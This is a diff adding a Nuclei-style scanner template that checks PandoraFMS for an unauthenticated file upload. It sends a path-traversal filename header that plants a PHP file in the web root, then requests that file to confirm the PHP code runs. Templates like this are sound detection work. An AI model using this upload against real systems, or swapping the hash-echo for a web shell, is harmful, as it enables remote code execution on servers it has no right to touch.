@@ -1,0 +1,46 @@
+id: pandorafms-head-upload
+info:
+  name: PandoraFMS File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,pandorafms
+  description: |
+    PandoraFMS upload_head_image.php endpoint allows unauthenticated file upload, potentially leading to remote code execution.
+
+variables:
+  t1: '{{rand_int(100,1000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - /pandora_console/enterprise/meta/general/upload_head_image.php?up=true
+    headers:
+      Up-Filename: '../../../../../../../../../../var/www/html/pandora_console/extensions/test{{t1}}.php'
+    body: |-
+      <?php echo md5($_REQUEST['c']); ?>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "done"
+
+  - id: file-access
+    method: GET
+    path:
+      - '/pandora_console/extensions/test{{t1}}.php?c={{t1}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
